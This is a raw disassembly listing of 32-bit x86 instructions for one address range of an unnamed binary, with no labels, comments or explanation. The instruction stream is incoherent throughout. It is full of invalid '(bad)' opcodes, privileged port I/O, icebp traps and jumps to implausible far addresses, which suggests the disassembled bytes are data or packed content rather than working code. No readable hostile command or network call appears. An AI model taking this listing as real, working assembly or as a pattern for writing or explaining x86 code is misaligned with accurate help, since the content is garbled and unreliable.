  40ea7d:	out    dx,al
  40ea7e:	and    eax,DWORD PTR [eax+eax*1]
  40ea81:	add    DWORD PTR [edx],edi
  40ea83:	and    BYTE PTR [eax-0x10],0xf1
  40ea87:	jmp    0x40eafd
  40ea89:	jno    0x40ea54
  40ea8b:	hlt    
  40ea8c:	outs   dx,BYTE PTR ds:[esi]
  40ea8d:	xor    edx,esi
  40ea8f:	xlat   BYTE PTR ds:[ebx]
  40ea90:	and    al,0xb2
  40ea92:	in     al,dx
  40ea93:	ins    DWORD PTR es:[edi],dx
  40ea94:	pusha  
  40ea95:	jo     0x40ea87
  40ea97:	add    DWORD PTR [ebp+0x4b],esi
  40ea9a:	or     BYTE PTR [ecx+0x60],bh
  40ea9d:	jo     0x40ea8f
  40ea9f:	fisubr DWORD PTR [ebx]
  40eaa1:	xchg   eax,esi
  40eaa3:	add    dl,BYTE PTR [eax-0x67]
  40eaa6:	push   edi
  40eaa7:	arpl   WORD PTR [ecx+0x0],ax
  40eaaa:	xor    DWORD PTR [ebx+0x77],ebx
  40eaad:	ror    BYTE PTR [ecx],0x7d
  40eab0:	pop    esp
  40eab1:	add    BYTE PTR [ecx],dh
  40eab3:	aaa    
  40eab4:	add    ch,BYTE PTR [ebx]
  40eab6:	icebp  
  40eab7:	xlat   BYTE PTR ds:[ebx]
  40eab8:	ret    0x5374
  40eabb:	cmp    esi,DWORD PTR [edi-0x38]
  40eabe:	leave  
  40eabf:	ret    0x5c
  40eac2:	xor    DWORD PTR [eax+0x38f974eb],eax
  40eac8:	stc    
  40eac9:	stc    
  40eaca:	(bad)  
  40eacb:	sbb    edi,DWORD PTR [ebx+0x44]
  40eace:	jge    0x40eb03
  40ead0:	ja     0x40ea96
  40ead2:	leave  
  40ead3:	or     DWORD PTR [ebx],esp
  40ead5:	pop    edi
  40ead6:	xor    DWORD PTR [ecx],ecx
  40ead8:	mov    ecx,0xcd1dec
  40eadd:	cmc    
  40eade:	cdq    
  40eadf:	loop   0x40eaee
  40eae1:	jnp    0x40ead0
  40eae3:	mov    al,ds:0x9716f69
  40eae8:	jne    0x40eb21
  40eaea:	mov    dl,0x64
  40eaec:	xor    DWORD PTR [eax*1+0x31038133],eax
  40eaf3:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaf5:	in     al,dx
  40eaf6:	in     eax,0x10
  40eaf8:	shl    DWORD PTR [ebx-0x132a1e19],1
  40eafe:	in     eax,0xc8
  40eb00:	int    0x76
  40eb02:	sub    ecx,esi
  40eb04:	in     eax,dx
  40eb05:	or     DWORD PTR [edi-0x1e],0xffffffbd
  40eb09:	jbe    0x40ea90
  40eb0b:	loop   0x40eb48
  40eb0d:	cld    
  40eb0e:	add    BYTE PTR [esi-0x1b],dl
  40eb11:	sub    eax,0x1be237ed
  40eb16:	lods   al,BYTE PTR ds:[esi]
  40eb17:	das    
  40eb18:	pop    esp
  40eb19:	icebp  
  40eb1a:	(bad)  [ecx]
  40eb1c:	bound  edx,QWORD PTR [esi-0x56a3e014]
  40eb22:	(bad)  
  40eb24:	xchg   BYTE PTR [ebp-0x4ea3f014],al
  40eb2a:	fcomi  st,st(4)
  40eb2c:	xchg   BYTE PTR [ebp-0x14],dh
  40eb2f:	call   FWORD PTR [ebx-0x5b]
  40eb32:	fucomi st,st(4)
  40eb34:	xchg   BYTE PTR [ebp-0x14],ah
  40eb37:	out    dx,eax
  40eb38:	pop    ebx
  40eb39:	popf   
  40eb3a:	(bad)  [esi+eax*4+0x5bdfec55]
  40eb41:	xchg   ecx,eax
  40eb42:	fistp  DWORD PTR [esi+eax*4+0x13dbec45]
  40eb49:	push   0x6e
  40eb4b:	(bad)  [edx]
  40eb4d:	add    BYTE PTR [ebp+esi*1+0x304144ca],bh
  40eb54:	or     DWORD PTR [eax],eax
  40eb56:	jmp    0xea29500c
  40eb5b:	push   ds
  40eb5c:	sbb    DWORD PTR [eax+0x38],ebp
  40eb5f:	pop    ebp
  40eb60:	dec    eax
  40eb61:	add    BYTE PTR [esi],cl
  40eb63:	pop    ds
  40eb64:	aad    0xe7
  40eb66:	adc    edi,ebp
  40eb68:	or     BYTE PTR [eax],al
  40eb6a:	bnd jb 0x40ebc9
  40eb6d:	pop    es
  40eb6e:	cs div eax
  40eb71:	add    cl,ch
  40eb73:	add    BYTE PTR [edx],dh
  40eb75:	or     DWORD PTR [eax+0x56],ebp
  40eb78:	aam    0x47
  40eb7a:	add    dh,bl
  40eb7c:	loopne 0x40eb52
  40eb7e:	out    0xb9,eax
  40eb80:	clc    
  40eb81:	or     BYTE PTR [eax],al
  40eb83:	loop   0x40ebf7
  40eb85:	pop    esp
  40eb86:	pop    es
  40eb87:	scas   al,BYTE PTR es:[edi]
  40eb88:	lock lock add ecx,ebp
  40eb8c:	xor    cl,BYTE PTR [ecx]
  40eb8e:	(bad)  
  40eb8f:	cmp    al,0x79
  40eb91:	jmp    0xe28b56fe
  40eb96:	sti    
  40eb97:	(bad)  
  40eb99:	mov    eax,ds:0xe01a9efe
  40eb9e:	icebp  
  40eb9f:	inc    edi
  40eba0:	dec    ebp
  40eba1:	or     BYTE PTR [edi],cl
  40eba3:	fs stos BYTE PTR es:[edi],al
  40eba5:	(bad)  
  40eba7:	xchg   BYTE PTR [edx],bl
  40eba9:	push   esi
  40ebaa:	rcl    BYTE PTR [ecx+0x76fe8b4a],1
  40ebb0:	or     dl,BYTE PTR [esi-0x14]
  40ebb3:	xor    DWORD PTR [edx-0x75],0x456866fe
  40ebba:	lock mov ecx,0x5688570a
  40ebc0:	retf   0xebe8
  40ebc3:	push   ecx
  40ebc4:	retf   0x5edf
  40ebc7:	add    BYTE PTR [ecx],al
  40ebc9:	(bad)  
  40ebca:	push   cs
  40ebcb:	add    BYTE PTR [ebp+0xc81eb5f],bl
  40ebd1:	cdq    
  40ebd2:	cld    
  40ebd3:	inc    DWORD PTR [edi]
  40ebd5:	int3   
  40ebd6:	cmp    DWORD PTR [eax-0x20baa00],0x0
  40ebdd:	cwde   
  40ebde:	or     al,0x0
  40ebe0:	mov    ecx,ebp
  40ebe2:	adc    BYTE PTR [ebx],cl
  40ebe4:	sar    BYTE PTR [ecx+ecx*1+0x59983880],0x5
  40ebec:	jmp    0x40f2bd
  40ebf1:	xchg   DWORD PTR [ecx+0x14],ebx
  40ebf4:	call   0x3f4d99
  40ebf9:	arpl   sp,cx
  40ebfb:	jae    0x40ec0c
  40ebfd:	add    BYTE PTR [ebx-0xcb7beb3],bh
  40ec03:	jae    0x40ec19
  40ec05:	jo     0x40ec81
  40ec07:	cmp    edi,0x77
  40ec0a:	mov    edi,0x2393680b
  40ec0f:	inc    ecx
  40ec10:	add    BYTE PTR [edi-0x3017eba7],al
  40ec16:	mov    ch,bh
  40ec18:	jmp    DWORD PTR [ecx-0x38014977]
  40ec1e:	repnz or WORD PTR ds:[eax+eax*1],cx
  40ec24:	lea    ecx,[ebp-0x4800033a]
  40ec2a:	cmp    ebp,eax
  40ec2c:	call   FWORD PTR [ecx-0x7272020d]
  40ec32:	(bad)  
  40ec33:	cld    
  40ec34:	inc    DWORD PTR [edi-0x6f4a00c4]
  40ec3a:	icebp  
  40ec3b:	std    
  40ec3c:	inc    DWORD PTR [eax]
  40ec3e:	adc    BYTE PTR ds:0xf231006d,0x7b
  40ec45:	test   BYTE PTR [ebp+0x71feea4f],dl
  40ec4b:	xlat   BYTE PTR ds:[ebx]
  40ec4c:	jle    0x40ec33
  40ec4e:	xor    dl,dh
  40ec50:	add    cl,BYTE PTR [ebp-0x116cc5c]
  40ec56:	mov    dh,0x16
  40ec58:	add    eax,0x2f23110
  40ec5d:	shrd   DWORD PTR [edx+0x3],esi,cl
  40ec61:	add    BYTE PTR [ecx],dh
  40ec63:	gs inc ebp
  40ec65:	sub    al,0x1
  40ec67:	mov    dl,bl
  40ec69:	dec    esi
  40ec6a:	lock icebp 
  40ec6c:	fimul  DWORD PTR [ecx]
  40ec6e:	adc    al,0xf2
  40ec70:	add    cl,BYTE PTR [ebx]
  40ec72:	jno    0x40ecd0
  40ec74:	add    cl,ch
  40ec76:	cdq    
  40ec77:	lock add al,BYTE PTR [eax]
  40ec7a:	mov    esp,0x66fdc65c
  40ec7f:	mov    esi,0x220d4176
  40ec84:	pop    esp
  40ec85:	shl    esi,cl
  40ec87:	xor    BYTE PTR [eax+ebp*8],al
  40ec8a:	pop    esp
  40ec8b:	xor    eax,0xb23a0004
  40ec90:	outs   dx,BYTE PTR ds:[esi]
  40ec91:	add    eax,0x31a48
  40ec96:	xor    DWORD PTR [edi+0x3d19146e],ebp
  40ec9c:	js     0x40ec9c
  40ec9e:	es fadd st(2),st
  40eca1:	je     0x40eca3
  40eca3:	or     BYTE PTR cs:[esi-0x180f8fb9],dl
  40ecaa:	je     0x40ecd1
  40ecac:	js     0x40eca3
  40ecae:	add    DWORD PTR [esi],0x60
  40ecb1:	fisttp QWORD PTR [ecx]
  40ecb3:	mov    esi,eax
  40ecb5:	out    0x74,eax
  40ecb7:	sbb    eax,0xee83e188
  40ecbc:	or     DWORD PTR [esi+0x77],esp
  40ecbf:	mov    ebp,0xdfe95ecb
  40ecc4:	mov    WORD PTR [edx+0x41398317],?
  40ecca:	push   ds
  40eccb:	mov    ah,0xde
  40eccd:	inc    ebp
  40ecce:	push   esp
  40eccf:	popa   
  40ecd0:	fidiv  WORD PTR [ebx-0x1aab41ed]
  40ecd6:	call   0xf581fe18
  40ecdb:	lods   al,BYTE PTR ds:[esi]
  40ecdc:	fisub  WORD PTR ds:0x1d8850dc
  40ece2:	jmp    0x4291a70
  40ece7:	xor    DWORD PTR [edx+ebp*4+0x3c84b817],ecx
  40ecee:	jmp    0x68fc:0x2769de87
  40ecf5:	test   al,0x3
  40ecf7:	xor    dl,BYTE PTR [edi+eiz*4+0x5b]
  40ecfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecfc:	imul   ebp,DWORD PTR [eax],0x94946604
  40ed02:	jmp    0x5901cb66
  40ed07:	add    ah,al
  40ed09:	or     cl,ch
  40ed0b:	cld    
  40ed0c:	mov    ss,WORD PTR [ebp+0x14]
  40ed0f:	pop    esp
  40ed10:	mov    ds:0x3e042851,eax
  40ed15:	push   esp
  40ed16:	fstp   st(3)
  40ed18:	test   eax,0x2fe8ad85
  40ed1d:	xchg   esp,eax
  40ed1e:	pop    esp
  40ed1f:	jmp    0xdc79cb4b
  40ed24:	add    DWORD PTR [ebp+0x7166e895],eax
  40ed2a:	call   0x18e00b32
  40ed2f:	jmp    0xc7d1feb1
  40ed34:	aam    0xdd
  40ed36:	push   DWORD PTR [ebp-0x26]
  40ed39:	iret   
  40ed3a:	jg     0x40edaa
  40ed3c:	f2xm1  
  40ed3e:	shr    ecx,cl
  40ed40:	xor    cl,BYTE PTR [ecx]
  40ed42:	push   0x48529c
  40ed47:	push   esi
  40ed48:	xchg   DWORD PTR [ecx-0x1a26b103],ebx
  40ed4e:	sub    ah,dl
  40ed50:	xor    cl,BYTE PTR [ecx]
  40ed52:	or     ebp,DWORD PTR [ecx]
  40ed54:	dec    esi
  40ed55:	das    
  40ed56:	push   0x47fa5b
  40ed5b:	cs pop ds
  40ed5d:	cmc    
  40ed5e:	out    0xaa,eax
  40ed60:	es (bad) 
  40ed63:	push   ds
  40ed64:	iret   
  40ed65:	cdq    
  40ed66:	std    
  40ed67:	push   ss
  40ed68:	mov    DWORD PTR [ebp-0x18],ecx
  40ed6b:	bound  eax,QWORD PTR [eax]
  40ed6d:	push   cs
  40ed6e:	(bad)  
  40ed70:	cdq    
  40ed71:	cdq    
  40ed72:	push   esp
  40ed73:	adc    dh,bh
  40ed75:	or     al,0xd
  40ed77:	push   eax
  40ed78:	test   BYTE PTR [ecx+edx*1],0xe8
  40ed7c:	pop    esp
  40ed7d:	pop    edx
  40ed7e:	fdivp  st(6),st
  40ed80:	shl    DWORD PTR [edx+0x56deff5d],1
  40ed86:	xchg   esp,eax
  40ed87:	mov    bl,0xd7
  40ed89:	dec    esi
  40ed8a:	fsubrp st(7),st
  40ed8c:	pop    ds
  40ed8d:	jmp    0x7207:0x556a0008
  40ed94:	aad    0xbb
  40ed96:	je     0x40ed4b
  40ed98:	mov    bh,0x4e
  40ed9a:	fiadd  WORD PTR [edx]
  40ed9c:	cdq    
  40ed9d:	mov    dl,0xf2
  40ed9f:	add    DWORD PTR [edi],ecx
  40eda1:	lods   al,BYTE PTR ds:[esi]
  40eda2:	and    ch,BYTE PTR [esi]
  40eda4:	sbb    ah,BYTE PTR [eax+0x7529eb07]
  40edaa:	int    0x5f
  40edac:	sub    BYTE PTR ds:0x4400b4dc,dh
  40edb2:	jecxz  0x40edb1
  40edb4:	jmp    DWORD PTR [eax+0x8006ac8]
  40edba:	cmp    DWORD PTR [eax-0x28],ebp
  40edbd:	cmp    BYTE PTR [esi+0x0],al
  40edc0:	inc    ebp
  40edc2:	cdq    
  40edc3:	cld    
  40edc4:	(bad)  
  40edc5:	jg     0x40ed84
  40edc7:	mov    al,0x6c
  40edc9:	enter  0x5008,0x68
  40edcd:	jne    0x40ee34
  40edcf:	inc    ecx
  40edd0:	add    BYTE PTR [eax],al
  40edd2:	outs   dx,DWORD PTR ds:[esi]
  40edd3:	call   0xa1e6:0xe3fffeb2
  40edda:	in     al,dx
  40eddb:	or     BYTE PTR [eax],al
  40eddd:	pop    edx
  40edde:	rcr    edi,0xbe
  40ede1:	jne    0x40ed83
  40ede3:	(bad)  
  40ede5:	jne    0x40ed7b
  40ede7:	ffreep st(7)
  40ede9:	je     0x40ee59
  40edeb:	inc    eax
  40edec:	xchg   edx,eax
  40eded:	dec    eax
  40edee:	(bad)  [eax]
  40edf0:	push   DWORD PTR [ebp+0x64]
  40edf3:	shr    BYTE PTR [edi-0x21c807d],0xb5
  40edfa:	xor    al,0xe3
  40edfc:	std    
  40edfd:	dec    eax
  40edff:	shl    bh,0x83
  40ee02:	dec    edi
  40ee03:	jecxz  0x40ee53
  40ee05:	inc    DWORD PTR ds:0x4c75fef5
  40ee0b:	cmp    bh,bh
  40ee0d:	jne    0x40ee5f
  40ee0f:	shl    BYTE PTR [esi-0x6],0x6f
  40ee13:	jecxz  0x40edfb
  40ee15:	icebp  
  40ee16:	jmp    ebx
  40ee18:	std    
  40ee19:	(bad)  
  40ee1a:	vpaddb xmm7,xmm6,xmm7
  40ee1e:	fbstp  TBYTE PTR [edi]
  40ee20:	push   DWORD PTR [ebp-0x21974]
  40ee26:	rcl    BYTE PTR [eax+0x6b],0x0
  40ee2a:	xor    edx,esi
  40ee2c:	jg     0x40eded
  40ee2e:	ds gs and dh,bh
  40ee32:	push   es
  40ee33:	and    ebp,0xffffffb4
  40ee36:	add    BYTE PTR [ebp+0x9fee65b],bh
  40ee3c:	add    bl,BYTE PTR [ebx+0x0]
  40ee3f:	xor    DWORD PTR [ebx-0x50],ebp
  40ee42:	mov    bh,0xe7
  40ee44:	(bad)  
  40ee45:	out    0xe7,al
  40ee47:	lock mov edx,0x2fe8fee5
  40ee4d:	adc    eax,DWORD PTR [eax]
  40ee4f:	xlat   BYTE PTR fs:[bx]
  40ee52:	(bad)  
  40ee53:	cmp    al,0xd6
  40ee55:	in     eax,0x74
  40ee57:	and    DWORD PTR [ebx],ebx
  40ee59:	jo     0x40ee67
  40ee5b:	mov    dh,0x9c
  40ee5d:	cli    
  40ee5e:	out    0x24,eax
  40ee60:	sub    eax,0x2f78fee6
  40ee65:	idiv   edi
  40ee67:	add    eax,0x6d82d757
  40ee6c:	add    DWORD PTR [esi-0x1],ecx
  40ee6f:	add    al,0xbe
  40ee71:	fidivr DWORD PTR [edx+0xae602ad]
  40ee77:	jno    0x40eecd
  40ee79:	add    BYTE PTR [edi+0x68],bl
  40ee7c:	das    
  40ee7d:	idiv   edi
  40ee7f:	outs   dx,DWORD PTR ds:[esi]
  40ee80:	push   esp
  40ee81:	adc    ebp,eax
  40ee83:	fwait
  40ee84:	ins    DWORD PTR es:[edi],dx
  40ee85:	in     eax,0xfe
  40ee87:	sub    dh,BYTE PTR [edx-0x5709fa92]
  40ee8d:	ror    DWORD PTR [ebx],0x31
  40ee90:	retf   
  40ee91:	outs   dx,BYTE PTR ds:[esi]
  40ee92:	or     al,0x59
  40ee94:	lods   eax,DWORD PTR ds:[esi]
  40ee95:	jns    0x40ee95
  40ee97:	ds (bad) 
  40ee99:	ret    0x74
  40ee9c:	es dec edx
  40ee9e:	xchg   edx,eax
  40ee9f:	inc    edi
  40eea0:	jo     0x40ee92
  40eea2:	jecxz  0x40ef18
  40eea4:	xor    eax,0xb2029109
  40eea9:	ficomp DWORD PTR [ebp-0x1690d727]
  40eeaf:	in     al,0x85
  40eeb1:	or     eax,0xdab0ee81
  40eeb6:	test   DWORD PTR [ebx+0x75],edi
  40eeb9:	aad    0x10
  40eebb:	jg     0x40ef13
  40eebd:	dec    eax
  40eebe:	jmp    0x811654a7
  40eec3:	fidiv  WORD PTR [eax+0x757b65da]
  40eec9:	loope  0x40ee9b
  40eecb:	(bad)  
  40eecd:	or     ecx,ebp
  40eecf:	(bad)  [ecx+0x5a]
  40eed2:	dec    esi
  40eed3:	in     eax,0xb9
  40eed5:	inc    esp
  40eed6:	inc    ebp
  40eed7:	pop    esp
  40eed8:	xor    ecx,edi
  40eeda:	call   0xb686b7e2
  40eedf:	in     al,0xaf
  40eee1:	nop
  40eee2:	mov    ds:0x2154a7f3,eax
  40eee7:	fcomp  QWORD PTR [edi+0x2be51d86]
  40eeed:	leave  
  40eeee:	in     eax,0x7f
  40eef0:	int    0x9
  40eef2:	jmp    0x19574fa
  40eef7:	pop    esp
  40eef8:	mov    esp,ebx
  40eefa:	call   0xf5956502
  40eeff:	fild   DWORD PTR [eax]
  40ef01:	lods   al,BYTE PTR ds:[esi]
  40ef02:	outs   dx,DWORD PTR ds:[esi]
  40ef03:	jmp    0xeb22a10b
  40ef08:	hlt    
  40ef09:	mov    ah,0xa5
  40ef0b:	call   0x53cf2013
  40ef10:	call   0xf52a08e3
  40ef15:	mov    dl,0x81
  40ef17:	call   0x5bb2201f
  40ef1c:	arpl   ax,si
  40ef1e:	or     BYTE PTR [eax],al
  40ef20:	push   ds
  40ef21:	or     eax,0x32e96b3c
  40ef26:	push   cs
  40ef27:	rcr    BYTE PTR ds:0xa174da8c,0x7a
  40ef2e:	fimul  DWORD PTR [esi]
  40ef30:	jmp    0x99b5c967
  40ef35:	push   0x75
  40ef37:	inc    edi
  40ef38:	sub    BYTE PTR ds:0x7209a571,dh
  40ef3e:	or     DWORD PTR [edi-0x7f],edx
  40ef41:	popa   
  40ef42:	outs   dx,DWORD PTR ds:[esi]
  40ef43:	add    cl,ch
  40ef45:	jmp    0xd60262e3
  40ef4a:	push   esp
  40ef4b:	clc    
  40ef4c:	shl    DWORD PTR [ebx],cl
  40ef4e:	jno    0x40eeea
  40ef50:	leave  
  40ef51:	jae    0x40ef5c
  40ef53:	push   edi
  40ef54:	inc    ecx
  40ef55:	inc    ebx
  40ef56:	outs   dx,DWORD PTR ds:[esi]
  40ef57:	add    cl,ch
  40ef59:	mov    cl,0xd1
  40ef5b:	add    BYTE PTR [edi+eax*1-0x6ac68b26],dh
  40ef62:	push   esp
  40ef63:	hlt    
  40ef64:	inc    ecx
  40ef65:	add    BYTE PTR [edi+eax*4-0x2],ah
  40ef69:	add    cl,BYTE PTR es:[esi+0x599b12cf]
  40ef70:	cmp    al,dh
  40ef72:	pop    ds
  40ef73:	push   es
  40ef74:	(bad)  
  40ef75:	jmp    0x40ef65
  40ef77:	inc    esi
  40ef78:	or     ebx,DWORD PTR [ebx]
  40ef7a:	push   cs
  40ef7b:	add    al,0x80
  40ef7d:	ret    
  40ef7e:	xor    dl,BYTE PTR [esi+ebp*8-0xa]
  40ef82:	fdiv   st(0),st
  40ef84:	dec    edi
  40ef85:	out    dx,al
  40ef86:	aam    0x10
  40ef88:	call   0xff1b433b
  40ef8d:	rcl    edx,1
  40ef8f:	pop    edx
  40ef90:	call   esi
  40ef92:	pop    esi
  40ef93:	or     edi,edi
  40ef95:	push   esp
  40ef96:	cmp    eax,0x780074da
  40ef9b:	in     eax,0x73
  40ef9d:	or     BYTE PTR [eax+0x72],ah
  40efa0:	cld    
  40efa1:	jmp    edi
  40efa3:	jmp    0xece2afd9
  40efa8:	std    
  40efa9:	call   edi
  40efab:	mov    edi,0xfc0f38ac
  40efb0:	test   BYTE PTR [eax-0x59],ch
  40efb3:	in     al,dx
  40efb4:	std    
  40efb5:	call   FWORD PTR ds:0x3655e6b1
  40efbb:	in     al,dx
  40efbc:	std    
  40efbd:	(bad)  
  40efbe:	std    
  40efbf:	mov    esp,0xebe64de6
  40efc4:	std    
  40efc5:	(bad)  
  40efc6:	fnsave [esi+eiz*8-0x1429ffbb]
  40efcd:	std    
  40efce:	(bad)  
  40efcf:	std    
  40efd0:	mov    eax,0xebe63de6
  40efd5:	std    
  40efd6:	(bad)  
  40efd7:	fstp   st(4)
  40efd9:	std    
  40efda:	jne    0x40efa0
  40efdc:	jmp    0x40f051
  40efde:	or     BYTE PTR [eax+0x3f],ah
  40efe1:	(bad)  
  40efe2:	jmp    DWORD PTR [edi+0x4c]
  40efe5:	leave  
  40efe6:	ret    0xc84
  40efe9:	push   ebp
  40efea:	mov    eax,DWORD PTR [eax+edx*4-0x3e]
  40efee:	call   0xff55222a
  40eff3:	lods   eax,DWORD PTR ds:[esi]
  40eff4:	fsubr  st(6),st
  40eff6:	lea    esi,[edx+0x480b000c]
  40effc:	xor    DWORD PTR [edi+0x6a],edx
  40efff:	mov    BYTE PTR [edx+ebp*4+0x60],ah
  40f003:	cdq    
  40f004:	or     al,0xff
  40f006:	jne    0x40ef90
  40f008:	jmp    0x40f07d
  40f00a:	or     al,0x80
  40f00c:	xlat   BYTE PTR ds:[ebx]
  40f00d:	jg     0x40f00e
  40f00f:	ja     0x40f018
  40f011:	shl    BYTE PTR [ecx+esi*1+0x21],0x34
  40f016:	push   eax
  40f017:	pop    ecx
  40f018:	lods   al,BYTE PTR ds:[esi]
  40f019:	mov    esi,edi
  40f01b:	ds fcmovnb st,st(2)
  40f01e:	jae    0x40f020
  40f020:	pop    ecx
  40f021:	dec    eax
  40f022:	call   0x422bacc2
  40f027:	mov    bl,0xa6
  40f029:	loope  0x40f035
  40f02b:	icebp  
  40f02c:	cmc    
  40f02d:	(bad)  
  40f02e:	inc    BYTE PTR [eax]
  40f030:	pushf  
  40f031:	or     dh,BYTE PTR [eax+ebp*8]
  40f034:	loope  0x40f096
  40f036:	loop   0x40f036
  40f038:	popa   
  40f039:	xchg   DWORD PTR [edi-0x18],edx
  40f03c:	popa   
  40f03d:	(bad)  
  40f03e:	push   edi
  40f03f:	or     BYTE PTR [ecx],cl
  40f041:	mov    ebx,0x89eefee0
  40f046:	int    0x7c
  40f048:	out    0x66,al
  40f04a:	loop   0x40f0c0
  40f04c:	leave  
  40f04d:	cmp    esi,eax
  40f04f:	jl     0x40f027
  40f051:	ss jmp 0x40f011
  40f054:	dec    esp
  40f055:	aas    
  40f056:	loop   0x40f0bf
  40f058:	xor    edx,ebp
  40f05a:	add    al,BYTE PTR [eax]
  40f05c:	leave  
  40f05d:	sbb    ah,BYTE PTR [eax-0x1]
  40f060:	mov    dh,0x58
  40f062:	dec    eax
  40f063:	clc    
  40f064:	mov    esp,0xa64fdea4
  40f069:	pushf  
  40f06a:	repnz (bad) 
  40f06c:	and    al,0xde
  40f06e:	jmp    0x710b:0x2e208d3
  40f075:	je     0x40f0c9
  40f077:	(bad)  
  40f078:	in     al,dx
  40f079:	icebp  
  40f07a:	add    al,BYTE PTR [eax]
  40f07c:	xor    edx,esp
  40f07e:	leave  
  40f07f:	inc    esp
  40f080:	jge    0x40f058
  40f082:	or     BYTE PTR [eax],al
  40f084:	xor    DWORD PTR [edx+eax*1+0x28c316a],ecx
  40f08b:	push   0x31
  40f08d:	or     DWORD PTR [edi+eax*2+0x5d],esi
  40f091:	cmp    dh,bl
  40f093:	push   edi
  40f094:	add    BYTE PTR [ecx-0x29],cl
  40f097:	pop    ebx
  40f098:	aam    0x47
  40f09a:	pop    ebp
  40f09b:	int    0xec
  40f09d:	mov    WORD PTR [ecx-0x17],fs
  40f0a0:	add    ebp,DWORD PTR [edx]
  40f0a2:	leave  
  40f0a3:	xor    al,0x6
  40f0a5:	sbb    dl,BYTE PTR [ecx+eax*2]
  40f0a8:	jbe    0x40f118
  40f0aa:	dec    eax
  40f0ab:	jmp    0x913a9690
  40f0b0:	push   es
  40f0b1:	mov    al,0xd6
  40f0b3:	popf   
  40f0b4:	loope  0x40f03b
  40f0b6:	sar    DWORD PTR [eax],1
  40f0b8:	in     al,dx
  40f0b9:	jne    0x40f043
  40f0bb:	(bad)  
  40f0bc:	loope  0x40f067
  40f0be:	dec    esp
  40f0bf:	xchg   ebp,eax
  40f0c0:	loope  0x40f13f
  40f0c2:	icebp  
  40f0c3:	jge    0x40f11c
  40f0c5:	inc    ebp
  40f0c6:	(bad)  
  40f0c7:	sti    
  40f0c8:	out    dx,eax
  40f0c9:	out    0x5c,eax
  40f0cb:	fucom  st(0)
  40f0cd:	add    DWORD PTR gs:[ecx-0x5],edx
  40f0d1:	xlat   BYTE PTR ds:[ebx]
  40f0d2:	(bad)  
  40f0d3:	pop    ebp
  40f0d4:	loope  0x40f11b
  40f0d6:	in     eax,0x40
  40f0d8:	sbb    eax,0xe14dd644
  40f0dd:	jne    0x40f0b8
  40f0df:	push   ecx
  40f0e0:	xor    DWORD PTR [edi+0x8ec3d5c],0xa603e960
  40f0ea:	pop    esp
  40f0eb:	xor    esp,ebp
  40f0ed:	push   esp
  40f0ee:	push   esp
  40f0ef:	es loope 0x40f15b
  40f0f2:	retf   
  40f0f3:	hlt    
  40f0f4:	add    esp,esp
  40f0f6:	add    DWORD PTR [ebx+eax*4],0xedd7200
  40f0fd:	loope  0x40f17e
  40f0ff:	arpl   cx,bp
  40f101:	ins    DWORD PTR es:[edi],dx
  40f102:	dec    ebp
  40f103:	(bad)  
  40f104:	jae    0x40f111
  40f106:	pop    ecx
  40f107:	dec    esp
  40f108:	add    BYTE PTR [ebx+0x51],dh
  40f10b:	xlat   BYTE PTR ds:[ebx]
  40f10c:	mov    BYTE PTR [esi+edi*2-0x329bfb31],ah
  40f113:	inc    edi
  40f114:	add    cl,ch
  40f116:	xor    cl,BYTE PTR [ecx]
  40f118:	add    BYTE PTR [edi+ebp*4-0x21],ah
  40f11c:	std    
  40f11d:	into   
  40f11e:	push   ecx
  40f11f:	inc    esi
  40f120:	push   0x933ed
  40f125:	shl    ecx,1
  40f127:	ins    DWORD PTR es:[edi],dx
  40f128:	add    cl,ch
  40f12a:	call   0x4461:0x35286145
  40f131:	or     BYTE PTR [edx+0x9],dh
  40f134:	push   0x48923f
  40f139:	xchg   esi,eax
  40f13a:	pop    ds
  40f13b:	lahf   
  40f13c:	inc    edi
  40f13d:	sub    BYTE PTR ds:0xaf174d6,dh
  40f143:	scas   al,BYTE PTR es:[edi]
  40f144:	std    
  40f145:	jle    0x40f118
  40f147:	ins    DWORD PTR es:[edi],dx
  40f148:	dec    esp
  40f149:	or     BYTE PTR [edx+0x9],dh
  40f14c:	push   0x485225
  40f151:	shl    DWORD PTR [eax+0x68],1
  40f154:	inc    ecx
  40f155:	jmp    0xe940fcb4
  40f15a:	mov    dl,0xd6
  40f15c:	je     0x40f13f
  40f15e:	add    dl,cl
  40f160:	cmp    ebp,0x8484d146
  40f166:	ss nop
  40f168:	(bad)  
  40f169:	(bad)  
  40f16a:	cdq    
  40f16b:	call   0x74d6:0x32e9683d
  40f172:	and    eax,0x11085c91
  40f177:	(bad)  
  40f178:	dec    edi
  40f179:	call   DWORD PTR [esi]
  40f17b:	jnp    0x40f144
  40f17d:	add    ebp,ecx
  40f17f:	inc    edi
  40f180:	sub    bl,0x0
  40f183:	or     esi,ecx
  40f185:	repnz (bad) 
  40f187:	outs   dx,DWORD PTR ds:[esi]
  40f188:	mov    ch,0x68
  40f18a:	add    BYTE PTR [edx+0x5075ff2e],dh
  40f190:	loope  0x40f14e
  40f192:	jns    0x40f1e3
  40f194:	mov    ch,0x87
  40f196:	inc    ebp
  40f197:	ins    BYTE PTR es:[edi],dx
  40f198:	bound  ebx,QWORD PTR [edx]
  40f19a:	call   0x3e7e23
  40f19f:	push   ebx
  40f1a0:	leave  
  40f1a1:	jb     0x40f1c7
  40f1a3:	loopne 0x40f1dd
  40f1a5:	popa   
  40f1a6:	inc    ecx
  40f1a7:	sbb    BYTE PTR [ecx],bl
  40f1a9:	call   0xfdf58a0e
  40f1ae:	push   eax
  40f1af:	jo     0x40f1be
  40f1b1:	adc    bh,ch
  40f1b3:	mov    fs,WORD PTR [ebp-0x70]
  40f1b6:	popa   
  40f1b7:	pop    ecx
  40f1b8:	or     eax,0x525ff50
  40f1bd:	call   0xfdf5670d
  40f1c2:	call   0xffaa05c7
  40f1c7:	call   DWORD PTR [edi+0x19607d02]
  40f1cd:	or     eax,0x8c80001
  40f1d2:	lea    eax,[ebp-0x24c89]
  40f1d8:	mov    BYTE PTR [eax+0x4],ah
  40f1db:	add    eax,ebx
  40f1dd:	or     al,ch
  40f1df:	stc    
  40f1e0:	test   DWORD PTR [eax],0x6d7c6800
  40f1e6:	inc    ecx
  40f1e7:	add    BYTE PTR [eax-0x67be9eb4],al
  40f1ed:	pusha  
  40f1ee:	pop    esi
  40f1ef:	popa   
  40f1f0:	leave  
  40f1f1:	or     bh,bh
  40f1f3:	xor    eax,0x4144f6
  40f1f8:	das    
  40f1f9:	xor    cl,BYTE PTR [eax]
  40f1fb:	call   0xff21e231
  40f200:	jle    0x40f18c
  40f202:	dec    esi
  40f203:	popa   
  40f204:	lock loope 0x40f271
